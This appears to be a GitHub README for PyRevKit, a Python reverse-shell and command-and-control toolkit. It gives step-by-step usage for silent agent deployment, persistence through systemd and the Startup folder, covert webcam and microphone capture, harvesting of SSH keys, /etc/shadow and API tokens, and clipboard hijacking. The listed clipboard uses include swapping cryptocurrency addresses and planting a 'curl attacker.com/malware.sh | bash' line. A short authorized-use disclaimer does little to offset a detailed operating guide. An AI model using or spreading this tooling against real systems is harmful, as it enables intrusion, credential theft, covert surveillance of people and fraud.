# PyRevKit

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey)](https://github.com/yourusername/pyrevkit)

A powerful, secure reverse shell toolkit with encrypted WebSocket communication, file transfer capabilities, media capture, advanced reconnaissance, and authentication system.

## 🎯 Features

### Core Features
- **🔐 Secure Communication**: TLS/SSL encrypted WebSocket connections
- **🔑 Authentication**: PBKDF2-SHA256 hashed credentials with salting
- **📁 File Transfer**: Bidirectional file upload/download with base64 encoding
- **🔄 Auto-Reconnection**: Exponential backoff retry mechanism
- **🎭 Persistent Targets**: Targets remain connected between operator sessions
- **🤖 Autonomous Deployment**: Pre-configured credentials for silent deployment
- **📊 Multi-Session**: Multiple operators can connect to the same target sequentially
- **🛡️ Safe Execution**: Command timeout protection (30s default)

### Media Capture
- **📸 Webcam Capture**: Take photos via target's webcam
- **🎤 Audio Recording**: Record audio from target's microphone (1-300 seconds)
- **💾 Automatic Storage**: All media saved in `loot/` directory

### Advanced Reconnaissance
- **🔍 File Search**: Search files by name pattern with customizable limits
- **📝 Content Search**: Search inside text files for sensitive data
- **📊 System Information**: Comprehensive system profiling (OS, hardware, network, storage)
- **📋 Clipboard Access**: Read and write clipboard content on target machines

## 📋 Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Usage](#usage)
  - [Server Setup](#server-setup)
  - [Target Deployment](#target-deployment)
  - [Client Connection](#client-connection)
  - [File Transfer Commands](#file-transfer-commands)
  - [Media Capture Commands](#media-capture-commands)
  - [Reconnaissance Commands](#reconnaissance-commands)
  - [Clipboard Commands](#clipboard-commands)
- [Examples](#examples)
- [Configuration](#configuration)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)
- [License](#license)

## 🚀 Installation

### Requirements

**Core (Required):**
- Python 3.7 or higher
- `websockets` library

**Optional (For Advanced Features):**
- `opencv-python` - Webcam capture
- `sounddevice`, `scipy`, `numpy` - Audio recording
- `pyperclip` - Clipboard management

### Linux / macOS

```bash
# Clone the repository
git clone https://github.com/yourusername/pyrevkit.git
cd pyrevkit

# Install dependencies
pip3 install websockets

# Or using requirements.txt
pip3 install -r requirements.txt

# Optional: Install media capture dependencies
pip3 install -r requirements-media.txt

# Optional: Install all advanced features
pip3 install -r requirements-advanced.txt

# Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -nodes \
  -out server.pem -keyout server.pem -days 365 \
  -subj "/CN=YOUR_SERVER_IP"
```

### Windows

```powershell
# Clone the repository
git clone https://github.com/yourusername/pyrevkit.git
cd pyrevkit

# Install dependencies
pip install websockets

# Or using requirements.txt
pip install -r requirements.txt

# Optional: Install media capture dependencies
pip install -r requirements-media.txt

# Optional: Install all advanced features
pip install -r requirements-advanced.txt

# Generate SSL certificate (requires OpenSSL for Windows)
openssl req -x509 -newkey rsa:4096 -nodes -out server.pem -keyout server.pem -days 365
```

### Docker (Optional)

```bash
docker build -t pyrevkit .
docker run -d -p 8765:8765 --name pyrevkit-server pyrevkit
```

## ⚡ Quick Start

### 1. Setup Credentials

```bash
# Add operator credentials
python pyrev_server.py -creds operator admin SecurePassword123!

# Add target credentials
python pyrev_server.py -creds target machineA TargetPassword456!
```

### 2. Start the Server

```bash
python pyrev_server.py
```

Output:
```
[+] Directories ready: loot/, payloads/
[+] Server running on wss://0.0.0.0:8765
[+] Credentials file: credentials.json
[+] Loot directory: loot/
[+] Payloads directory: payloads/
```

### 3. Connect a Target

```bash
python pyrev_target.py
```

Interactive mode:
```
Server host [192.168.2.110]: 
Server port [8765]: 
--- Authentication ---
Login: machineA
Password: [hidden]
[+] Connected and authenticated. Waiting for commands...
```

### 4. Connect as Operator

```bash
python pyrev_client.py
```

```
--- Authentication ---
Login: admin
Password: [hidden]
[+] Connected to server
Target ID: machineA
[+] Interactive session started
>>> whoami
root
>>> 
```

## 🏗️ Architecture

```
┌─────────────────┐         ┌────────────────┐         ┌────────────────┐
│     Operator    │         │   C2 Server    │         │     Target     │
│                 │◄───────►│   - Auth       │◄───────►│                |
│                 │  WSS    │   - Relay      │  WSS    │                │
│  pyrev_client   │         │   - Files      │         │  pyrev_target  │
└─────────────────┘         │                │         └────────────────┘
                            |  pyrev_server  |
                            └────────────────┘
                                     │
                              ┌──────┴──────┐
                              │             │
                            loot/       payloads/
```

### Components

- **pyrev_server.py**: Central C2 server handling authentication, relay, and file operations
- **pyrev_client.py**: Operator interface for sending commands and managing files
- **pyrev_target.py**: Agent deployed on target machines

### File Structure

```
pyrevkit/
├── pyrev_server.py          # C2 Server
├── pyrev_client.py          # Operator client
├── pyrev_target.py          # Target agent
├── requirements.txt         # Python dependencies
├── server.pem              # SSL certificate (generated)
├── credentials.json        # Hashed credentials (auto-created)
├── loot/                   # Downloaded files from targets
└── payloads/               # Files to upload to targets
```

## 📖 Usage

### Server Setup

#### Start Server

```bash
python pyrev_server.py [OPTIONS]
```

**Options:**
- `-creds ROLE LOGIN PASSWORD` - Add/update credentials
- `-host HOST` - Server host (default: 0.0.0.0)
- `-port PORT` - Server port (default: 8765)
- `-cert FILE` - SSL certificate file (default: server.pem)

**Examples:**

```bash
# Add operator
python pyrev_server.py -creds operator alice MyPass123

# Add target
python pyrev_server.py -creds target prod-web-01 TargetPass456

# Start on custom port
python pyrev_server.py -host 0.0.0.0 -port 9000
```

#### Credential Management

Credentials are stored in `credentials.json` with PBKDF2-SHA256 hashing:

```json
{
  "operator": {
    "admin": {
      "hash": "0b2ad92a1f3e68487a780b3c6d7ab33c...",
      "salt": "e48cbd452e38b9337130dcb82f3b761c..."
    }
  },
  "target": {
    "machineA": {
      "hash": "f61a20f536c15913156a282b3eb84b03...",
      "salt": "ff789cd49679ebadd2f60b02094ae21b..."
    }
  }
}
```

### Target Deployment

#### Interactive Mode

```bash
python pyrev_target.py
```

The script will prompt for:
- Server host
- Server port
- Login credentials

#### Autonomous Mode (Silent Deployment)

Edit the configuration section in `pyrev_target.py`:

```python
# ========== CONFIGURATION ==========
TARGET_ID = "machineA"
SERVER_HOST = "192.168.2.110"
SERVER_PORT = 8765

AUTO_LOGIN = "machineA"           # Fill for auto-connect
AUTO_PASSWORD = "TargetPass456"   # Fill for auto-connect
# ====================================
```

Then simply run:

```bash
python pyrev_target.py
```

Output:
```
[+] Auto-connecting to 192.168.2.110:8765 as machineA
[+] Connected and authenticated. Waiting for commands...
```

**Persistence Examples:**

Linux (systemd):
```bash
sudo nano /etc/systemd/system/pyrevkit.service
```

```ini
[Unit]
Description=PyRevKit Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /opt/pyrevkit/pyrev_target.py
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable pyrevkit
sudo systemctl start pyrevkit
```

Windows (Startup):
```batch
# Add to: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pyrevkit.bat
@echo off
cd C:\Tools\pyrevkit
python pyrev_target.py
```

### Client Connection

```bash
python pyrev_client.py
```

**Session Flow:**

1. Enter server connection details
2. Authenticate with operator credentials
3. Specify target ID to connect to
4. Interactive command prompt

```
>>> help
```

### File Transfer Commands

#### Download Files from Target

```bash
>>> download /etc/passwd
[*] Requesting download: /etc/passwd
[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
```

**Features:**
- Automatic renaming with target prefix
- Size display
- Max file size: 10MB
- Supports absolute and relative paths

#### Upload Files to Target

```bash
>>> upload exploit.sh
[*] Uploading: exploit.sh
[✓] Saved exploit.sh (5.67 KB) → downloads/exploit.sh
```

Files are uploaded from the server's `payloads/` directory to the target's `downloads/` folder.

#### List Files

```bash
# List downloaded files (server-side)
>>> ls_loot
Files in loot/:
  - machineA_passwd (2.45 KB)
  - machineA_config.txt (1.23 KB)

# List available payloads
>>> ls_payloads
Files in payloads/:
  - exploit.sh (5.67 KB)
  - payload.exe (234.56 KB)
```

### Media Capture Commands

#### Webcam Capture

Capture photos from the target's webcam:

```bash
>>> webcam
[*] Capturing webcam...
[✓] Webcam captured (156.78 KB) → loot/machineA_webcam_20260403_143022.jpg
```

**Features:**
- JPEG format
- Native webcam resolution
- Automatic timestamped naming
- Saved to `loot/` directory

**Requirements:**
- Target must have `opencv-python` installed: `pip install opencv-python`
- Webcam must be accessible (not used by another application)

#### Audio Recording

Record audio from the target's microphone:

```bash
>>> record 30
[*] Recording 30 seconds of audio...
[✓] Audio recorded (5.05 MB) → loot/machineA_audio_20260403_143522.wav
```

**Parameters:**
- Duration: 1 to 300 seconds (5 minutes max)
- Format: WAV, 44.1kHz, 16-bit, stereo
- Approximate size: ~170 KB per second

**Examples:**
```bash
>>> record 10      # 10 seconds (~1.7 MB)
>>> record 60      # 1 minute (~10 MB)
>>> record 300     # 5 minutes (max, ~50 MB)
```

**Requirements:**
- Target must have audio libraries installed:
  ```bash
  pip install sounddevice scipy numpy
  ```

### Reconnaissance Commands

#### File Search

Search for files by name pattern:

```bash
>>> search *.pdf
[*] Searching for files: *.pdf
[✓] Found 15 results:
  1. C:\Users\John\Documents\report.pdf (523.45 KB)
  2. C:\Users\John\Desktop\invoice.pdf (102.34 KB)
  ...
```

**With custom limit:**
```bash
>>> search *.pem --limit 200
[*] Searching for files: *.pem (limit: 200)
[✓] Found 79 results:
  1. /home/user/cert1.pem (5.61 KB)
  ...
  79. /home/user/cert79.pem (3.24 KB)
```

**Supported patterns:**
- `*.pdf` - All PDF files
- `*.docx` - All Word documents
- `password*` - Files starting with "password"
- `*config*` - Files containing "config"
- `secret.txt` - Specific file

**Default limit:** 100 results (use `--limit N` to customize)

#### Content Search

Search inside text files for sensitive data:

```bash
>>> search --content "password"
[*] Searching for content: password
[✓] Found 8 results:
  1. C:\config.txt:45
     database_password=admin123
  2. C:\Users\John\notes.txt:12
     Remember to change password next week
  ...
```

**With custom limit:**
```bash
>>> search --content "api_key" --limit 300
[*] Searching for content: api_key (limit: 300)
[✓] Found 45 results:
  1. /app/config.json:23
     "api_key": "sk_live_abc123..."
  ...
```

**Supported file types:**
- Text files: `.txt`, `.log`, `.conf`, `.config`, `.ini`
- Code files: `.py`, `.sh`, `.bat`, `.cmd`
- Data files: `.xml`, `.json`

**Limitations:**
- Max file size: 10MB per file
- Text files only (binary files skipped)

#### System Information

Gather comprehensive system information:

```bash
>>> sysinfo
[*] Gathering system information...
[✓] System Information - machineA

System:
  os: Windows
  os_version: 10.0.19045
  os_release: 10
  hostname: DESKTOP-ABC123
  architecture: AMD64
  processor: Intel64 Family 6 Model 158 Stepping 10
  python_version: 3.11.0

User:
  username: admin
  home: C:\Users\admin

Network:
  hostname: DESKTOP-ABC123
  local_ip: 192.168.1.100

Storage:
  C: 120.5GB free / 512.0GB total
  D: 50.2GB free / 1024.0GB total

Environment:
  PATH: C:\Windows\system32;C:\Windows;...
  TEMP: C:\Users\admin\AppData\Local\Temp
```

**Information collected:**
- Operating system details
- Hardware specifications
- Current user and home directory
- Network configuration
- Storage/disk space
- Environment variables

**No additional dependencies required** - uses Python standard library only.

### Clipboard Commands

#### Read Clipboard

Capture clipboard content from the target:

```bash
>>> clipboard
[*] Reading clipboard...
[✓] Clipboard content:
MySecretPassword123!
```

**Use cases:**
- Capture copied passwords
- Intercept copied credentials
- Monitor user activity
- Capture API keys and tokens

#### Write Clipboard

Inject content into the target's clipboard:

```bash
>>> clipboard set "Hello from operator"
[*] Setting clipboard...
[✓] Clipboard updated
```

**Use cases:**
- Replace cryptocurrency addresses
- Inject phishing URLs
- Modify copied commands
- Social engineering attacks

**Requirements:**
- Target must have `pyperclip` installed: `pip install pyperclip`
- Graphical environment required (not headless servers)
- **Linux:** Requires `xclip` or `xsel`:
  ```bash
  sudo apt-get install xclip


#### All Available Commands

| Command | Description | Example |
|---------|-------------|---------|
| **Basic Commands** |
| `<command>` | Execute shell command | `whoami`, `ls -la` |
| `help` | Show help message | `help` |
| `exit` / `quit` | Disconnect from target | `exit` |
| **File Transfer** |
| `download <file>` | Download file from target | `download /etc/shadow` |
| `upload <file>` | Upload file to target | `upload payload.exe` |
| `ls_loot` | List downloaded files | `ls_loot` |
| `ls_payloads` | List available payloads | `ls_payloads` |
| **Media Capture** |
| `webcam` | Capture photo via webcam | `webcam` |
| `record <seconds>` | Record audio (1-300s) | `record 30` |
| **Reconnaissance** |
| `search <pattern>` | Search files by name | `search *.pdf` |
| `search <pattern> --limit <N>` | Search with custom limit | `search *.log --limit 500` |
| `search --content <text>` | Search file contents | `search --content "password"` |
| `search --content <text> --limit <N>` | Content search with limit | `search --content "api" --limit 200` |
| `sysinfo` | Gather system information | `sysinfo` |
| **Clipboard** |
| `clipboard` | Read clipboard content | `clipboard` |
| `clipboard set <text>` | Set clipboard content | `clipboard set "payload"` |

## 💡 Examples

### Example 1: Basic Reconnaissance

```bash
>>> whoami
root

>>> uname -a
Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

>>> pwd
/root

>>> ls -la
total 48
drwx------  5 root root 4096 Apr  3 10:30 .
drwxr-xr-x 19 root root 4096 Mar 15 08:12 ..
-rw-------  1 root root  220 Mar 15 08:12 .bash_logout
```

### Example 2: Data Exfiltration

```bash
>>> download /etc/passwd
[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd

>>> download /etc/shadow
[✓] Downloaded shadow (1.89 KB) → loot/machineA_shadow

>>> download /home/user/.ssh/id_rsa
[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa

>>> ls_loot
Files in loot/:
  - machineA_passwd (2.45 KB)
  - machineA_shadow (1.89 KB)
  - machineA_id_rsa (3.24 KB)
```

### Example 3: Payload Deployment

```bash
>>> ls_payloads
Files in payloads/:
  - reverse_shell.sh (265 bytes)
  - privilege_escalation.py (3.21 KB)

>>> upload reverse_shell.sh
[✓] Saved reverse_shell.sh (0.26 KB) → downloads/reverse_shell.sh

>>> chmod +x downloads/reverse_shell.sh

>>> bash downloads/reverse_shell.sh 192.168.1.100 4444
```

### Example 4: Multi-Session Workflow

Terminal 1 (Server):
```bash
$ python pyrev_server.py
[+] Server running on wss://0.0.0.0:8765
[+] Target machineA connected
```

Terminal 2 (Target):
```bash
$ python pyrev_target.py
[+] Auto-connecting to 192.168.2.110:8765 as machineA
[+] Connected and authenticated. Waiting for commands...
```

Terminal 3 (Operator 1):
```bash
$ python pyrev_client.py
>>> whoami
root
>>> exit
```

Terminal 4 (Operator 2 - connects to same target):
```bash
$ python pyrev_client.py
>>> pwd
/root
```

### Example 5: Media Surveillance

```bash
# Capture webcam photo
>>> webcam
[✓] Webcam captured (156.78 KB) → loot/machineA_webcam_20260403_143022.jpg

# Record 30 seconds of audio
>>> record 30
[✓] Audio recorded (5.05 MB) → loot/machineA_audio_20260403_143522.wav

# Check who's at the machine
# Download and review the webcam image from loot/ directory
```

### Example 6: Credential Harvesting

```bash
# Search for SSH keys
>>> search id_rsa
[✓] Found 3 results:
  1. /home/john/.ssh/id_rsa (3.24 KB)
  2. /home/admin/.ssh/id_rsa (2.98 KB)

# Search for certificates
>>> search *.pem --limit 100
[✓] Found 79 results:
  1. /etc/ssl/private/server.pem (5.61 KB)
  ...

# Search for passwords in config files
>>> search --content "password" --limit 200
[✓] Found 45 results:
  1. /app/config.json:23
     "database_password": "admin123"
  2. /home/user/.bashrc:15
     export DB_PASSWORD="secret"
  ...

# Download sensitive files
>>> download /home/john/.ssh/id_rsa
[✓] Downloaded id_rsa (3.24 KB) → loot/machineA_id_rsa
```

### Example 7: System Profiling

```bash
# Gather complete system information
>>> sysinfo
[✓] System Information - machineA
System:
  os: Windows 10
  hostname: PROD-WEB-01
  architecture: AMD64
  
Network:
  local_ip: 192.168.1.100
  
Storage:
  C: 50.2GB free / 512.0GB total

# Search for interesting configuration files
>>> search *.conf --limit 50
>>> search config.json
>>> search settings.ini
```

### Example 8: Clipboard Monitoring

```bash
# Monitor clipboard for copied credentials
>>> clipboard
[✓] Clipboard content:
john.doe@example.com

# Wait for user to copy password...
>>> clipboard
[✓] Clipboard content:
MySecretPassword123!

# Replace clipboard with malicious payload
>>> clipboard set "curl http://attacker.com/malware.sh | bash"
[✓] Clipboard updated
```

### Example 9: Complete Reconnaissance Workflow

```bash
# Step 1: System profiling
>>> sysinfo
[✓] System Information collected

# Step 2: Search for sensitive files
>>> search *.pem --limit 200
>>> search *.key --limit 100
>>> search id_rsa

# Step 3: Search for credentials in files
>>> search --content "password" --limit 300
>>> search --content "api_key" --limit 200
>>> search --content "secret" --limit 200

# Step 4: Media surveillance
>>> webcam
>>> record 60

# Step 5: Clipboard monitoring
>>> clipboard

# Step 6: Download everything found
>>> download /path/to/sensitive/file1
>>> download /path/to/sensitive/file2
```

### Example 10: Advanced Search Operations

```bash
# Find all log files
>>> search *.log --limit 500
[✓] Found 342 results:
  ...

# Search for database connection strings
>>> search --content "mysql://" --limit 100
>>> search --content "postgresql://" --limit 100
>>> search --content "mongodb://" --limit 100

# Find configuration files
>>> search *config* --limit 200
>>> search *.ini --limit 100
>>> search *.conf --limit 100

# Search for API keys and tokens
>>> search --content "Bearer " --limit 150
>>> search --content "token" --limit 200
>>> search --content "Authorization:" --limit 100
```

## ⚙️ Configuration

### Server Configuration

Edit `pyrev_server.py` constants:

```python
LOOT_DIR = "loot"           # Directory for downloaded files
PAYLOADS_DIR = "payloads"   # Directory for payloads to upload
CREDS_FILE = "credentials.json"
```

### Target Configuration

Edit `pyrev_target.py` header:

```python
TARGET_ID = "machineA"        # Unique identifier
SERVER_HOST = "192.168.2.110" # C2 server address
SERVER_PORT = 8765            # C2 server port
AUTO_LOGIN = ""               # Set for autonomous mode
AUTO_PASSWORD = ""            # Set for autonomous mode
DOWNLOAD_DIR = "downloads"    # Received files directory
```

### Client Configuration

Edit `pyrev_client.py` constants:

```python
OP_ID = "operator1"  # Operator identifier
```

## 🔒 Security Considerations

### ⚠️ Important Warnings

1. **For Educational/Authorized Use Only**: Only use on systems you own or have explicit permission to test
2. **Credential Storage**: Passwords are hashed but stored on disk
3. **SSL Certificate**: Use valid certificates in production
4. **Network Security**: Consider firewall rules and network segmentation

### Security Features

✅ **TLS/SSL Encryption**: All traffic encrypted via WSS  
✅ **Password Hashing**: PBKDF2-SHA256 with 100,000 iterations  
✅ **Salt per User**: Unique 32-byte salt prevents rainbow tables  
✅ **Timing Attack Protection**: Constant-time comparison  
✅ **Command Timeout**: 30-second limit on command execution  
✅ **File Size Limits**: 10MB maximum file transfer size  

### Recommendations

- Use strong, unique passwords (16+ characters)
- Rotate credentials regularly
- Use firewall rules to restrict server access
- Monitor server logs for suspicious activity
- Use valid SSL certificates (not self-signed) in production
- Set restrictive file permissions: `chmod 600 credentials.json`

## 🐛 Troubleshooting

### Connection Issues

**Problem**: `[ERROR] Connection rejected`

**Solution**:
```bash
# Verify server is running
netstat -tulpn | grep 8765

# Check firewall
sudo ufw allow 8765/tcp

# Verify certificate exists
ls -l server.pem
```

**Problem**: `cannot call recv while another coroutine is running`

**Solution**: Server automatically handles this by cancelling old relays. Update to latest version.

### Authentication Issues

**Problem**: `Authentication failed`

**Solution**:
```bash
# Verify credentials exist
cat credentials.json

# Re-add credentials
python pyrev_server.py -creds target machineA NewPassword123

# Check for typos in login/password
```

### File Transfer Issues

**Problem**: `[✗] File not found`

**Solution**:
```bash
# For download: verify file exists on target
>>> ls /path/to/file

# For upload: verify file in payloads/
ls -l payloads/
```

**Problem**: `[✗] File too large`

**Solution**: Files over 10MB are rejected. Compress or split the file:
```bash
# On target
tar -czf archive.tar.gz large_directory/
>>> download archive.tar.gz
```

### Media Capture Issues

**Problem**: `[✗] OpenCV not installed`

**Solution**:
```bash
# On target machine
pip install opencv-python
```

**Problem**: `[✗] Cannot access webcam`

**Solutions**:
- Close other applications using the webcam
- Verify webcam is connected: `ls /dev/video*` (Linux)
- Check user permissions: `sudo usermod -a -G video $USER` (Linux)

**Problem**: `[✗] Audio libraries not installed`

**Solution**:
```bash
# On target machine
pip install sounddevice scipy numpy

# Linux may also need
sudo apt-get install portaudio19-dev python3-dev
```

**Problem**: Audio recording fails or is silent

**Solutions**:
- Check microphone is not muted
- Verify default audio device: `python -c "import sounddevice as sd; print(sd.query_devices())"`
- Test manually: Run `test_media.py` script

### Search Issues

**Problem**: No results found when files clearly exist

**Solutions**:
- Check file permissions (target may not have access)
- Increase limit: `search *.pdf --limit 500`
- Verify pattern syntax (case-insensitive)
- Try broader pattern: `search *password*`

**Problem**: Content search returns too many results

**Solutions**:
- Use more specific search term
- Adjust limit: `search --content "exact_phrase" --limit 50`

**Problem**: Search is slow

**Solution**: This is normal for large filesystems. Consider:
- Reducing limit: `--limit 100`
- Searching specific file types only
- Being more specific with patterns

### Clipboard Issues

**Problem**: `[✗] Clipboard library not installed`

**Solution**:
```bash
# On target machine
pip install pyperclip
```

**Problem**: `[✗] Clipboard read timeout`

**Solutions**:
- **Linux**: Install clipboard tools
  ```bash
  sudo apt-get install xclip  # For X11
  sudo apt-get install wl-clipboard  # For Wayland
  ```
- Verify graphical environment: `echo $DISPLAY` (should show `:0` or similar)
- Not supported on headless servers

**Problem**: Clipboard command hangs

**Solution**: 
- Update to latest version (timeout protection added)
- Run diagnostic: `python test_clipboard.py` on target
- Ensure target is not headless

**Problem**: Clipboard works but returns empty

**Solutions**:
- Clipboard is actually empty
- Clipboard contains non-text data (images, files)
- Copy some text manually and try again

### System Information Issues

**Problem**: Some information missing in sysinfo output

**Solution**: This is normal. Information availability depends on:
- Operating system
- User permissions
- Python version

No fix needed - system provides what it can access.

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚖️ Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this program. Use responsibly and only on systems you own or have explicit permission to test.

## 📚 Additional Resources

### Documentation
- [MEDIA_CAPTURE.md](MEDIA_CAPTURE.md) - Complete guide for webcam and audio features
- [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md) - File search, sysinfo, and clipboard documentation
- [CLIPBOARD_TROUBLESHOOTING.md](CLIPBOARD_TROUBLESHOOTING.md) - Comprehensive clipboard troubleshooting
- [QUICKREF.md](QUICKREF.md) - Quick reference guide for all commands

### Testing Tools
- `test_media.py` - Test webcam and audio capabilities
- `test_clipboard.py` - Diagnose clipboard functionality

### Dependencies Reference

**Core (required):**
```bash
pip install websockets>=12.0
```

**Media Capture (optional):**
```bash
pip install opencv-python>=4.5.0      # Webcam
pip install sounddevice>=0.4.6        # Audio
pip install scipy>=1.7.0 numpy>=1.21.0  # Audio processing
```

**Advanced Features (optional):**
```bash
pip install pyperclip>=1.8.0          # Clipboard
```

**All optional features:**
```bash
pip install -r requirements-advanced.txt
```

### Protocol Specifications
- [PBKDF2 Specification](https://tools.ietf.org/html/rfc2898)
- [WebSocket Protocol](https://tools.ietf.org/html/rfc6455)
- [TLS Best Practices](https://wiki.mozilla.org/Security/Server_Side_TLS)

## 🎯 Complete Feature Matrix

| Feature | Dependencies | Platforms | Status |
|---------|--------------|-----------|--------|
| **Core Features** |
| Shell Commands | None | All | ✅ |
| File Transfer | None | All | ✅ |
| Authentication | None | All | ✅ |
| Auto-Reconnect | None | All | ✅ |
| **Media Capture** |
| Webcam | opencv-python | All* | ✅ |
| Audio Recording | sounddevice, scipy, numpy | All* | ✅ |
| **Reconnaissance** |
| File Search | None | All | ✅ |
| Content Search | None | All | ✅ |
| System Info | None | All | ✅ |
| Clipboard | pyperclip | GUI only** | ✅ |

\* Camera/microphone must be available  
\*\* Requires graphical environment (not headless)

### Platform-Specific Notes

**Windows:**
- All features work out of the box after installing dependencies
- Clipboard works without additional tools
- Webcam LED may turn on during capture

**Linux:**
- Webcam requires user in `video` group
- Audio requires user in `audio` group  
- Clipboard requires `xclip` (X11) or `wl-clipboard` (Wayland)
- Headless servers: media and clipboard features unavailable

**macOS:**
- All features work natively
- First use requires permission prompts (webcam, microphone, clipboard)
- Clipboard uses native `pbcopy`/`pbpaste`

## 🙏 Acknowledgments

- Built with Python's `asyncio` and `websockets` libraries
- Inspired by modern C2 frameworks
- Thanks to the security research community

---

**⭐ If you find this project useful, please consider giving it a star!**

**📧 Contact**: your.email@example.com  
**🐛 Issues**: [GitHub Issues](https://github.com/yourusername/pyrevkit/issues)  
**💬 Discussions**: [GitHub Discussions](https://github.com/yourusername/pyrevkit/discussions)
